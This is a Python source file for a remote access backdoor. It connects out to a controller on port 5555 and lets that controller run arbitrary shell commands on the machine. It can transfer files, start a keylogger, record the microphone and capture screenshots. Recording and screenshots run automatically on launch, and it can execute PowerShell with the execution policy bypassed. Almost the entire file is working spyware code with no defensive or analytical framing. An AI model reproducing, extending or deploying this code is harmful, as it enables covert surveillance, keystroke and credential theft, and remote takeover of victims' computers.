# Import necessary Python modules\
# install library 
#pip install screeninfo, pip install numpy, pip install sounddevice, pip install soundfile, pip install pynput,  pip install datetime, pip install mss#
import socket # For network communication
import time # For adding delays
import subprocess # For running shell commands
import json # For encoding and decoding data in JSON format
import os # For interacting with the operating system
import numpy as np # For numerical operations and data manipulation
import sounddevice as sd # For recording audio using various audio devices
import soundfile as sf # For reading and writing sound files
from pynput import keyboard # To capture keyboard inputs
import threading # For running tasks in parallel threads
import pyautogui # For GUI automation tasks like screenshots
import datetime # For handling date and time operations, such as timestamps
import logging # For logging events for debugging and processing
from mss import mss  # Import mss to efficiently capture screenshots on multiple operating systems
from screeninfo import get_monitors  # Import get_monitors to fetch monitor information

# Function to send data in a reliable way (encoded as JSON)
def reliable_send(data):
    jsondata = json.dumps(data) # Convert data to JSON format
    s.send(jsondata.encode()) # Send the encoded data over the network

# Function to receive data in a reliable way (expects JSON data)
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip() # Receive data in chunks and decode
            return json.loads(data) # Parse the received JSON data
        except ValueError:
            continue

# Function to establish a connection to a remote host
# Setting environment as our PC as remote host IP address 127.0.0.1 Port 5555 to connection as test
def connection():
    while True:
        time.sleep(20) # Wait for 20 seconds before reconnecting (for resilience)
        try:
            # Connect to a remote host with Ex setup (IP '192.168.1.12' and port 5555)
            s.connect(('127.0.0.1', 5555))
            # Once connected, enter the shell() function for command execution
            shell()
            # Close the connection when done
            s.close()
            break
        except:
            # If a connection error occurs, retry the connection by continue do try loop 
            continue

# Function to upload a file to the remote host
def upload_file(file_name):
    with open(file_name, 'rb') as f:
        s.send(f.read())

# Function to download a file from the remote host
def download_file(file_name):
    with open(file_name, 'wb') as f: # Open a file for binary write mode
        s.settimeout(1) # Set a timeout for receiving data
        chunk = s.recv(1024) # Receive data in chunks of 1024 bytes
        while chunk:
            f.write(chunk) # Write the received data to the file
            try:
                chunk = s.recv(1024) # Receive the next chunk
            except socket.timeout:
                break
        s.settimeout(None) # Reset the timeout setting
        f.close() # Close the file when done

# Keylogger Function
class Keylogger:
    def __init__(self):
        self.log = ""
        self.listener = None
        self.running = False

    def on_press(self, key):
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        try:
            # Record characters if possible
            self.log += f"{timestamp} - {key.char}\n"
        except AttributeError:
            # Handle special keys
            if key == keyboard.Key.space:
                self.log += f"{timestamp} - SPACE\n"
            elif key == keyboard.Key.enter:
                self.log += f"{timestamp} - ENTER\n"
            elif key == keyboard.Key.tab:
                self.log += f"{timestamp} - TAB\n"
            else:
                self.log += f"{timestamp} - {str(key)}\n"

    def start(self):
        if not self.running:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.running = True
            print("[+] Keylogger started.")
    
    def stop(self):
        if self.running:
            self.listener.stop()
            self.running = False
            print("[+] Keylogger stopped.")

    def get_log(self):
        if self.log:
            print("[+] Keylog captured: ", self.log)
            temp_log = self.log
            self.log = ""  # Clear the log after sending
            return temp_log
        else:
            return "[+] No keylogs captured."


# Audio Capture Function
def find_suitable_device():
    devices = sd.query_devices()
    suitable_device = None
    for device in devices:
        if device['max_input_channels'] >= 0:
            try:
                # Test if the device can be opened with default settings
                with sd.InputStream(device=device['name']):
                    suitable_device = device['name']
                    break
            except Exception as e:
                print(f"Could not open device {device['name']}: {e}")
    return suitable_device

def record_audio(file_name, duration=10):
    device_name = find_suitable_device()
    if not device_name:
        print("No suitable input device found.")
        return

    try:
        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        file_name_with_timestamp = f"{file_name}_{timestamp}.wav"
        
        print(f"Auto Recording after run, audio for {duration} seconds using device '{device_name}'...")
        device_info = sd.query_devices(device_name, 'input')
        sample_rate = int(device_info['default_samplerate'])
        
        with sd.InputStream(samplerate=sample_rate, device=device_name, channels=1):
            recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=1)
            sd.wait()  # Wait until recording is finished
            sf.write(file_name_with_timestamp, recording, sample_rate)
            
            full_path = os.path.abspath(file_name_with_timestamp)
            print(f"Audio recorded and saved to '{full_path}'")  # Display the full path and file name with timestamp
    except Exception as e:
        print(f"An error occurred: {e}")

# Usage
record_audio('recorded_audio')

# Screenshot functionality
def take_screenshot(file_name, format='png'):
    with mss() as sct:
        # This will include all monitors individually, including the virtual screen if needed
        for i, monitor in enumerate(sct.monitors[1:], start=1):  # Change to [1:] to exclude the virtual screen aggregation
            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            filename_with_timestamp = f"{file_name}_{i}_{timestamp}.{format}"
            full_path = os.path.abspath(filename_with_timestamp)
            
            # Capture the screenshot for the current monitor
            sct_img = sct.shot(mon=i, output=full_path)
            
            print(f"[+] Screenshot of monitor {i} saved as '{full_path}'.")

# Usage example
take_screenshot('screenshot')

#Privilege Elevation:
# Function to ensure the required directory exists
def ensure_directory_exists(path):
    directory = os.path.dirname(path)
    if not os.path.exists(directory):
        os.makedirs(directory)
        logging.info(f"Directory created at {directory}")

def run_elevated(command):
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    # Path to save the PowerShell script
    script_path = "C:\\Windows\\Temp\\elevate.ps1"
    
    # Ensure the directory exists before writing the script
    ensure_directory_exists(script_path)

    # PowerShell script content
    script_content = f"""
    $output = Invoke-Expression -Command '{command}' 2>&1
    $output | Out-String
    """

    try:
        with open(script_path, 'w') as script_file:
            script_file.write(script_content)
        logging.info("Script written to " + script_path)

        # Execute the PowerShell script
        execute = subprocess.Popen(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = execute.communicate()

        if execute.returncode == 0:
            logging.info("Command executed with elevated privileges.")
            return stdout.decode().strip()
        else:
            logging.error("Failed to execute command with elevated privileges.")
            return stderr.decode().strip()
    except subprocess.TimeoutExpired:
        logging.error("PowerShell script execution timed out.")
        return "Error: PowerShell script execution timed out."
    except Exception as e:
        logging.error(f"Error during command execution: {str(e)}")
        return f"Error during execution: {str(e)}"
    finally:
        # Clean up: remove the PowerShell script
        if os.path.exists(script_path):
            os.remove(script_path)
            logging.info("Script file removed.")


# Command Shell
def shell():
    keylogger = Keylogger()
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command.startswith('cd '):
            os.chdir(command[3:])
        elif command.startswith('download'):
            upload_file(command[9:])
        elif command.startswith('upload'):
            download_file(command[7:])
        elif command.startswith('sudo '):
            elevated_command = command[5:]  # Remove 'sudo ' prefix
            result = run_elevated(elevated_command)
            reliable_send(result)
        elif command.startswith('record'):
            # Record audio
            file_name = command[7:]
            record_audio(file_name)
            upload_file(file_name)
        elif command.startswith('screenshot'):
            # Take a screenshot with a given filename
            file_name = command[11:]  # Assumes format 'screenshot filename.png'
            take_screenshot(file_name)
            upload_file(file_name)
        elif command == 'start_keylogger':
            print("[+] Starting Keylogger...")
            keylogger_thread = threading.Thread(target=keylogger.start)
            keylogger_thread.start()
        elif command == 'stop_keylogger':
            stop = keylogger.stop()
            reliable_send(stop)
            keylogger.stop()
        elif command == 'get_keylog':
            log = keylogger.get_log()
            reliable_send(log)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

# Target Communication
# def target_communication():
#     while True:
#         try:
#             command = input('* Shell~%s: ' % str(ip))
#             reliable_send(command)

#             if command == 'quit':
#                 break
#             elif command == 'clear':
#                 os.system('clear')
#             elif command.startswith('cd '):
#                 pass  # 'cd' command will be handled by the client, just a placeholder here
#             elif command.startswith('download '):
#                 download_file(command[9:])
#             elif command.startswith('upload '):
#                 upload_file(command[7:])
#             elif command == 'start_keylogger':
#                 print("[+] Starting Keylogger...")
#             elif command == 'stop_keylogger':
#                 print("[+] Stopping Keylogger...")
#                 log = reliable_recv()
#                 print(log)
#             elif command == 'get_keylog':
#                 log = reliable_recv()
#                 print("[+] Keylog received: \n" + log)
#             elif command.startswith('screenshot ') or command == 'capture_multi' or command.startswith('screenshot_periodic '):
#                 result = reliable_recv()  # Awaiting screenshot confirmation or data
#                 print(result)
#             elif command.startswith('elevate_privilege'):
#                 # Attempt to elevate privileges
#                 print("[+] Attempting to elevate privileges...")
#                 result = reliable_recv()  # Awaiting confirmation of privilege escalation
#                 print(result)
#             elif command.startswith('sudo '):
#                 # Special case for sudo commands, may require confirmation or additional data
#                 result = reliable_recv()
#                 print(result)
#             else:
#                 result = reliable_recv()
#                 print(result)
#         except Exception as e:
#             print(f"Error handling command '{command}': {e}")
#             continue


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()